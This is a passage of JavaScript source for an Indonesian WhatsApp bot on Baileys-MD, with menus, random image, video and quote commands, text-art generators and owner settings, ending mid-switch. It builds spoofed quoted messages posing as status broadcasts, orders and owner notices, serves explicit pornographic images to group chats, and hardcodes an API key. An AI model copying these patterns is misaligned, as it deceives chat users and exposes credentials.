const floc2 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) }, message: { "liveLocationMessage": { "title": 'tes',"h": 'ok', 'jpegThumbnail': fs.readFileSync('./function/mod.jpg')}}} // lokasi terkini 

const ftroli = { key: { fromMe: false, "participant": "62895340684706@s.whatsapp.net", "remoteJid": "status@broadcast" }, "message": { orderMessage: { itemCount: 2022, status: 200, thumbnail: fs.readFileSync ('./function/mod.jpg'), surface: 200, message: `${setting.ownerName}`, orderTitle: `${setting.ownerName}`, sellerJid: '0@s.whatsapp.net' }}, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }

// Fake Broadcast
let bcnye = { key : { participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { locationMessage: { name: `_*「 Broadcast Bot 」*_`, jpegThumbnail: fs.readFileSync('./function/mod.jpg')}}}

conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
let buttonMessage = {
text,
footer,
buttons,
headerType: 2,
...options
}
conn.sendMessage(jid, buttonMessage, { quoted, ...options })
}

conn.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)
}
await conn.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}

async function sendArulMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await conn.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

// case menu
const button_menu = [
{ buttonId: '.allmenu', buttonText: { displayText: `${setting.buttonEmoji.listMenu} List Menu` },type: 1 },
{ buttonId: '.owner', buttonText: { displayText: `${setting.buttonEmoji.owner} Owner` }, type: 1 },
{ buttonId: '.donasi', buttonText: { displayText: `${setting.buttonEmoji.donasi} Donasi` }, type: 1 }
]

const tyu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v)
const tre = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
const goblock = await conn.fetchBlocklist()
const bio = (await conn.fetchStatus(sender).catch(console.error) || {}).status || '-'
const namenyo = `${cekUser("name", sender)}`
const premnyo = `${cekUser("premium", sender)? 'Aktif':'Tidak'}`
const jawabb = `Hi ${namenyo}

╭─❒ 「 Bot Info 」 
├ Creator : @${itu_mark.split('@')[0]}
├ Powered : @${ini_mark.split('@')[0]}
├ Prefix : ${prefix}
├ Total Hit : ${jumlahcmd}
├ Platform : linux
├ Terdaftar : ${("id", db_user).length}
├ Private Chat : ${tyu.length}
├ Group Chat : ${tre.length}
├ User Blockir : ${goblock == undefined ? '0' : goblock.length} Users
├ Runtime : ${runtime(process.uptime())}
╰❒

╭─❒ 「 Date Info 」 
├ Hari : ${janghar}
├ Tanggal : ${titit}
├ Bulan : ${kanjud}
├ Tahun : ${tutut}
╰❒

╭─❒ 「 Time Info 」 
├ Wib : ${wib} WIB 
├ Wita : ${wita} WITA
├ Wit : ${wit} WIT
╰❒

╭─❒ 「 User Info 」 
├ Name : ${namenyo}
├ Nomor : @${sender.split('@')[0]}
├ Bio : ${bio ? bio : '-'}
├ Premium : ${premnyo}
├ Owner : ${isOwner ? 'True' : 'False'}
╰❒
`
const mentss = [itu_mark, sender, ini_mark]
const buttonMenu = {
document: pp_bot,
fileName: nameDoc,
mimetype: `${filsk}`,
fileLength: jumhal,
pageCount: jumlha,
jpegThumbnail: pp_bot,
caption: jawabb,
mentions: mentss,
footer: setting.footer, 
buttons: button_menu,
headerType: 4,
contextInfo: {
"externalAdReply": { 
"title" : 'WhatsApp Bot Multi Device',
"mediaType" : 1,
"renderLargerThumbnail" : true , 
"showAdAttribution": true, 
"jpegThumbnail": pp_bot,
"mediaUrl": setting.group.link, 
"thumbnail": pp_bot,
"sourceUrl" : setting.group.link 
}}
}

// case chat
var nomorcuy = q.split('|')[0] ? q.split('|')[0] : q
var okecuy = q.split('|')[1] ? q.split('|')[1] : ''
var vesan = `${okecuy}`
var ciporot = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `_*「 Pesan Dari Owner 」*_`,jpegThumbnail: fs.readFileSync('./function/mod.jpg')}}}
var yondaktau = `${nomorcuy}@s.whatsapp.net`

const button_nye = [
{ buttonId: '.menu', buttonText: { displayText: `${setting.buttonEmoji.menu} Menu` }, type: 1 }, 
{ buttonId: '.owner', buttonText: { displayText: `Owner ${setting.buttonEmoji.owner2}` }, type: 1 }
]

// setap awal case menu kecil
let namenya = `${cekUser("name", sender)}`
let premnya = `${cekUser("premium", sender)? 'Aktif':'Tidak'}`
let usernya = `${("id", db_user).length}`
let romnya = `${db_menfes.length}`
let muns = [itu_mark, sender]

const info_bot = `${ucapanWaktu} @${sender.split('@')[0]}

╭─〔  BOT INFO  〕─⬡
│◦ Library : Baileys-MD
│◦ Owner : @${itu_mark.split('@')[0]}
│◦ Runtime : ${runtime(process.uptime())}
│◦ Terdaftar : ${usernya}
│◦ Premium : ${premnya}
│◦ Room Chat : ${romnya}
╰─────────┈ `

var button_daftar = [{ buttonId: `.daftar ${pushname}`, buttonText: { displayText: '◦ Daftar ◦' }, type: 1 }]
var fake_daftar = {key : {participant : '62895340684706@s.whatsapp.net', ...(from ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `*───「 Verifikasi 」───*`,jpegThumbnail: pp_bot}}}
var teks_daftar = `Hallo *@${sender.split('@')[0]}* Silahkan Verifikasi Terlebih Dahulu Sebelum Memakai Fitur Bot

◦ Format : ${prefix}daftar <nama>
◦ Contoh : ${prefix}daftar ${pushname}`
var footer_daftar = `klik button dibawah untuk verifikasi`
var mentso = [sender]

var daftarDlu = () => {
 conn.sendButtonText(from, button_daftar, teks_daftar, footer_daftar, fake_daftar, {mentions: mentso}) 
}
switch(command) {



case 'anonymouscmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + anonyMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'kerangcmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + kerangMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'funcmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + funMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'animecmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + animeMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'anonycmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + userMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'dlcmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + dlMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'storecmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + storeMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'bkpcmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + bkpMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'nsfwcmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + nsfwMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'searchcmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + searchMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'grupcmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + grupMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'randomcmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + randomMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'asupancmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + asupanMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'convertcmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + convertMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'textcmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + textMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'stikcmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + stikMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'toolscmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + toolsMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'bugcmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + bugMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'primboncmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + primbonMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'audiocmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + audioMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'ownercmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + ownerMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'maincmd':
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + mainMenu(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'tqto':
if (cekUser("id", sender) == null) return daftarDlu()
conn.sendButtonText(from, button_nye, info_bot + '\n\n' + tqto(prefix), setting.footer, floc2, {mentions: muns}) 
break

case 'menu':
if (cekUser("id", sender) == null) return daftarDlu()
conn.sendMessage(from, buttonMenu , { quoted: ftroli})
break

case 'chat':
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply (`Format : ${prefix + command} _<628xxx>|<teks>_`)
conn.sendButtonText(yondaktau, [{ buttonId: 'pqhrorndbei', buttonText: { displayText: 'Ok' }, type: 1 }], vesan, setting.footer, ciporot) 
reply(`Pesan Sukses Terkirim`)
break

case 'akira':
case 'akiyama':
case 'ana':
case 'asuna':
case 'ayuzawa':
case 'boruto':
case 'chitoge':
case 'deidara':
case 'doraemon':
case 'elaina':
case 'emilia':
case 'erza':
case 'gremory':
case 'hestia':
case 'hinata':
case 'inori':
case 'isuzu':
case 'itachi':
case 'itori':
case 'kaga':
case 'kagura':
case 'kakasih':
case 'kaori': 
case 'keneki':
case 'kotori':
case 'kurumi':
case 'madara':
case 'mikasa':
case 'miku':
case 'minato':
case 'naruto':
case 'nezuko':
case 'onepiece':
case 'pokemon':
case 'rize':
case 'sagiri':
case 'sakura':
case 'sasuke':
case 'shina':
case 'shinka':
case 'shizuka':
case 'shota':
case 'toukachan':
case 'tsunade':
case 'yuki': 
if (cekUser("id", sender) == null) return daftarDlu()
reply(mess.wait)
let yui = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Anime/${command}.json`)
result = yui[Math.floor(Math.random() * yui.length)]               
let btnAnime = [                   
{buttonId: `.${command}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let btnAnime2 = {
image: { url: result },
caption: `Random Image ${command}`,
footer: setting.footer,
buttons: btnAnime,
headerType: 4
}
conn.sendMessage(from, btnAnime2, { quoted: msg })
.catch(err => {
return reply('Error!')
})
break 

case 'waifu': 
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
reply(mess.wait)
var wpu = await fetchJson (`https://api.waifu.pics/sfw/${command}`)
var btnWaifu = [                   
{buttonId: `.${command}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
var buttonWaifu = {
image: { url: wpu.url },
caption: `Random ${command}`,
footer: setting.footer,
buttons: btnWaifu,
headerType: 4
}
conn.sendMessage(from, buttonWaifu, { quoted: msg })
.catch(err => {
return reply('Error!')
})
break

// NSFW
case 'ahegao':
case 'ass':
case 'bdsm':
case 'blowjob':
case 'cuckold':
case 'cum':
case 'femdom':
case 'foot':
case 'gangbang':
case 'gifs':
case 'glasses':
case 'hentai':
case 'manga':
case 'masturbation':
//case 'megumin':
//case 'neko':
case 'neko2':
case 'nekonime':
case 'nsfw2':
case 'orgy':
case 'panties':
case 'pussy':
case 'tentacles':
case 'thighs':
case 'zettai': 
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
var fgh = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Nsfw/${command}.json`)
var result = fgh[Math.floor(Math.random() * fgh.length)]               
var btnNsfw = [                   
{buttonId: `.${command}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
var buttonNsfw = {
image: { url: result },
caption: `Random ${command}`,
footer: setting.footer,
buttons: btnNsfw,
headerType: 4
}
conn.sendMessage(from, buttonNsfw, { quoted: msg })
.catch(err => {
return reply('Error!')
})
break

case 'cecan':
case 'cecan2':
case 'china':
case 'cogan':
case 'indonesia':
case 'japan':
case 'korea':
case 'malaysia':
case 'thailand':
case 'vietnam':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
reply(mess.wait)
var rrr = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Cecan/${command}.json`)
var pikk = rrr[Math.floor(Math.random() * rrr.length)] 
conn.sendMessage(from, { image: { url: pikk }, caption: '✅ Done' }, { quoted: msg })
.catch(err => {
return reply('Error!')
})
break

case 'asupan':
case 'euni':
case 'geayubi':
case 'natajadeh':
case 'rikagusriani':
case 'ukhty':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
reply(mess.wait)
var qqq = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Asupan/${command}.json`)
var pikk = qqq[Math.floor(Math.random() * qqq.length)] 
conn.sendMessage(from, { video: { url: pikk }, mimetype: 'video/mp4', fileName: `${setting.botName}.mp4`, caption: '✅ Done' }, { quoted: msg })
.catch(err => {
return reply('Error!')
})
break

case 'santuy':
case 'bocil':
case 'harley':
case 'storywa':
case 'anony':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
reply(mess.wait)
var ppp = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Asupan/${command}.json`)
var pick = ppp[Math.floor(Math.random() * ppp.length)] 
conn.sendMessage(from, { video: { url: pick.url }, mimetype: 'video/mp4', fileName: `${setting.botName}.mp4`, caption: '✅ Done' }, { quoted: msg })
.catch(err => {
return reply('Error!')
})
break

case 'doge':
case 'among':
case 'mukalu':
case 'animestick':
case 'animegif':
case 'paimon':
case 'patrickgif':
case 'random':
case 'patrick': 
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
reply(mess.wait)
var asd = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Sticker/${command}.json`)
var wifegerakx = asd[Math.floor(Math.random() * asd.length)]
var encmedia = await conn.sendImageAsSticker(from, wifegerakx, msg, { packname: setting.sticker.packname, author: setting.sticker.author, })
await fs.unlinkSync(encmedia)
.catch(err => {
return reply('Error!')
})
break

case 'kapankah': {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${text}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
conn.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: msg })
}
break

case 'bisakah':
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya menjadi wibu`)
const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Gabisa','TENTU PASTI KAMU BISA!!!!','Bisa Banget','Nggak Kek Nya🗿','Nggak']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
conn.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: msg })
break

case 'bagaimanakah':
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} cara menjadi wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee','Mana saya tau, saya kan bot🗿']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
conn.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: msg })
break

case 'apakah':
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
conn.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: msg })
break

case 'etsgdjdjdjeiejetikddhkdj':
let member = participants.map(u => u.id)
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `「 Undangan Bermain  」 

Hallo @${jodoh.split('@')[0]}, Kamu Diajak Oleh @${sender.split('@')[0]} Untuk Bermain Truth Or Dare️
`
let ments = [sender, jodoh]
let buttons = [
{ buttonId: `sfnegjyjyysoh`, buttonText: { displayText: 'Ok' }, type: 1 }]
await conn.sendButtonText(from, buttons, jawab, setting.footer, msg, {mentions: ments})
break

case 'fakta': {
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
const x16 = await fetchJson("https://api.popcat.xyz/fact")
const x17 = await fetchJson(`https://api.popcat.xyz/translate?to=id&text=${x16.fact}`)
let ogeh = `*———「 Fakta 」———*\n\n`
conn.sendButtonText(from, [{ buttonId: '.fakta', buttonText: { displayText: 'Next' }, type: 1 }], ogeh + x17.translated + `\n`, setting.footer, msg) 
}
break

case 'crinj': {
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
const x18 = await fetchJson("https://api.popcat.xyz/joke")
const x19 = await fetchJson(`https://api.popcat.xyz/translate?to=id&text=${x18.joke}`)
//replay(x19.translated)
conn.sendButtonText(from, [{ buttonId: '.crinj', buttonText: { displayText: 'Next' }, type: 1 }], `\n` + x19.translated + `\n`, setting.footer, msg) 
}
break

case 'motivasi':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
let kabau5 = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Quotes/motivasi.json`)
let pitih5 = kabau5[Math.floor(Math.random() * kabau5.length)] 
let mmotivasi = `_「 Random Motivasi 」_

${pitih5}
`
conn.sendButtonText(from, [{ buttonId: `.motivasi`, buttonText: { displayText: '➡️ Next' }, type: 1 }], mmotivasi, setting.footer, msg)
break

case 'nurhadi':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
let kabau4 = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Quotes/nurhadi.json`)
let pitih4 = kabau4[Math.floor(Math.random() * kabau4.length)] 
let mnurhadi = `_「 Quotes Nurhadi 」_

${pitih4}
`
conn.sendButtonText(from, [{ buttonId: `.nurhadi`, buttonText: { displayText: '➡️ Next' }, type: 1 }], mnurhadi, setting.footer, msg)
break

case 'ngawur':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
let kabau3 = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Quotes/ngawur.json`)
let pitih3 = kabau3[Math.floor(Math.random() * kabau3.length)] 
let mngawur = `_「 Random Ngawur 」_

${pitih3}
`
conn.sendButtonText(from, [{ buttonId: `.ngawur`, buttonText: { displayText: '➡️ Next' }, type: 1 }], mngawur, setting.footer, msg)
break

case 'sad':
case 'sedih':
case 'galau':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
let kabau2 = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Quotes/kata_galau.json`)
let pitih2 = kabau2[Math.floor(Math.random() * kabau2.length)] 
let mgalau = `_「 Random Galau 」_

${pitih2}
`
conn.sendButtonText(from, [{ buttonId: `.galau`, buttonText: { displayText: '➡️ Next' }, type: 1 }], mgalau, setting.footer, msg)
break

case 'gombal':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
let kabau1 = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Quotes/gombal.json`)
let pitih1 = kabau1[Math.floor(Math.random() * kabau1.length)] 
let mgombal = `_「 Random Gombal 」_

${pitih1}
`
conn.sendButtonText(from, [{ buttonId: `.gombal`, buttonText: { displayText: '➡️ Next' }, type: 1 }], mgombal, setting.footer, msg)
break

case 'nyindir':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
let mkabau = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Quotes/nyindir.json`)
let pitih = mkabau[Math.floor(Math.random() * mkabau.length)] 
let myindir = `_「 Random Nyindir 」_

${pitih}
`
conn.sendButtonText(from, [{ buttonId: `.nyindir`, buttonText: { displayText: '➡️ Next' }, type: 1 }], myindir, setting.footer, msg)
break

case 'fiersa':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
let kabau = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Quotes/fiersa.json`)
let wuwu = kabau[Math.floor(Math.random() * kabau.length)] 
let mfiersa = `_「 Random Fiersa 」_

${wuwu}
`
conn.sendButtonText(from, [{ buttonId: `.fiersa`, buttonText: { displayText: '➡️ Next' }, type: 1 }], mfiersa, setting.footer, msg)
break

case 'bacot':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
let jawi = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Quotes/bacot.json`)
let uwuw = jawi[Math.floor(Math.random() * jawi.length)] 
let bacotan = `_「 Random Bacot 」_

${uwuw}
`
conn.sendButtonText(from, [{ buttonId: `.bacot`, buttonText: { displayText: '➡️ Next' }, type: 1 }], bacotan, setting.footer, msg)
break

case 'quotes': { 
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
let anu = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Quotes/quotes.json`)
let yoo = anu[Math.floor(Math.random() * anu.length)] 
let txt = `_「 Random Quotes 」_

${yoo.quotes}
`
conn.sendButtonText(from, [{ buttonId: '.quotes', buttonText: { displayText: '➡️ Next Quotes' }, type: 1 }], txt, `~ ${yoo.author}`, msg) 
}
break

case 'bucin':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
let samuik = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Quotes/bucin.json`)
let www = samuik[Math.floor(Math.random() * samuik.length)] 
let bucinan = `_「 Random Bucin 」_

${www}
`
conn.sendButtonText(from, [{ buttonId: `.bucin`, buttonText: { displayText: '➡️ Next' }, type: 1 }], bucinan, setting.footer, msg)
break

case 'senja':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
let kabau6 = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Quotes/quotes_senja.json`)
let pitih6 = kabau6[Math.floor(Math.random() * kabau6.length)] 
let msenja = `_「 Quotes Senja 」_

${pitih6}
`
conn.sendButtonText(from, [{ buttonId: `.senja`, buttonText: { displayText: '➡️ Next' }, type: 1 }], msenja, setting.footer, msg)
break

case 'isgd': 
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply (`*Contoh :*\n${command} http://google.com`)
let isgd = await fetchJson(`https://api-yogipw.herokuapp.com/api/short/isgd?url=${q}`)
let isgd2 = `Link Original : ${q}\nLink Shortlink : ${isgd.result.link}`
conn.sendButtonText(from, button_nye, isgd2, setting.footer, msg )
break

case 'glitch': 
case 'devil': 
case 'anciented':
case 'batman':
case 'black':
case 'carved':
case 'demon':
case 'diamond':
case 'golden3d':
case 'blackpinkrose':
case 'blackpinkstyle':
case 'bussines3d':
case 'graffitiart':
case 'harrypotter':
case 'holographic':
case 'joker':
case 'led':
case 'magma':
case 'marvel':
case 'matrix':
case 'neon':
case 'neon3d':
case 'neonblackpink':
case 'rainbow':
case 'slicetext':
case 'spooky':
case 'summerneon':
case 'thor':
case 'thunder':
case 'thunder2':
case 'transformer':
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply ('Masukan Teks')
reply(mess.wait)
conn.sendMessage(from, { image: { url: `https://api.itsrose.my.id/textpro/${command}?text=${q}` }, caption: '✅ Done' }, { quoted: msg })
.catch(err => {
return reply('Error!')
})
break

case 'allmenu':{
if (cekUser("id", sender) == null) return daftarDlu()
var no = 1
var ad = 1
var footer_nya =` _Powered By @${itu_mark.split("@")[0]}_`
var menu_nya =`${listmenu(sender,prefix,ad,namenya,premnya,usernya,romnya,tanggal,jam,ucapanWaktu,readmore)}`
let btn_menu = [
{buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner' }, type: 1 },
{buttonId: `${prefix}rules`, buttonText: { displayText: 'Rules' }, type: 1 }
]
var but_menu = {
text: menu_nya,
footer: footer_nya,
buttons: btn_menu,
mentions: [sender, itu_mark],
headerType: 1
}
conn.sendMessage(from, but_menu, {quoted:floc2})
}
break

case 'donate':
case 'donasi':{
var monoSpace = '```'
let cekName = `${cekUser("name", sender)}`
reply(donasiBot(cekName,ucapanWaktu))
}
break

case 'mediafire': 
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply('*Contoh:*\n.mediafire https://www.mediafire.com/file/451l493otr6zca4/V4.zip/file')
let isLinks = q.match(/(?:https?:\/{2})?(?:w{3}\.)?mediafire(?:com)?\.(?:com|be)(?:\/www\?v=|\/)([^\s&]+)/)
if (!isLinks) return reply('Link Invalid')
reply('*Mengunduh Media...*')
let baby1 = await mediafireDl(`${isLinks}`)
if (baby1[0].size.split('MB')[0] >= 50) return reply('File Melebihi Batas '+util.format(baby1))
let result4 = `-----[ *MEDIAFIRE DOWNLOADER* ]-----

◦ Name : ${baby1[0].nama}
◦ Size : ${baby1[0].size}
◦ Type : ${baby1[0].mime}
`
reply(result4)
if (isGroup) return reply('Document Sudah Dikirim Melalui Pesan Pribadi')
conn.sendMessage(sender, {document:{url:baby1[0].link}, fileName:baby1[0].nama, mimetype: baby1[0].mime}, {quoted:msg}).catch ((err) => reply('Gagal saat mendownload File'))
break

case 'grupbot':
case 'groupbot':
case 'gcbot':
reply(`${setting.group.judul}
${setting.group.link}`)
break

case 'infobot':
var teks_info = `*Bot Info*
• Author : @${itu_mark.split('@')[0]}
• Owner : ${setting.ownerName}
• Botname : ${setting.botName}
• Library : Baileys-MD
• Time : ${jam} WIB
• Date : ${tanggal}
• Terdaftar : ( ${("id", db_user).length} )
• Room Chat : ( ${db_menfes.length} )`
let btn_info = [
{buttonId: `${prefix}menu`, buttonText: { displayText: 'Menu' }, type: 1 }
]
var but_info = {
text: teks_info,
footer: setting.footer,
buttons: btn_info,
mentions: [itu_mark],
headerType: 1
}
conn.sendMessage(from, but_info, {quoted:msg})
break

case 'ssweb-pc':
case 'ssweb-hp':{
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply(`Masukan parameter url\n*Contoh:*\n${prefix+command} https://google.com`)
reply(mess.wait)
let anu =`https://leyscoders-api.herokuapp.com/api/${command}?url=${q}&apikey=IkyOgiwara`
conn.sendMessage(from, { image: {url: anu}, caption: 'Done!'}, {quoted:msg})
}
break

case 'setfooter':
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n#setfooter ${setting.footer}`)
setting.footer = q
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
reply('Sukses mengganti footer')
break

case 'setlink':
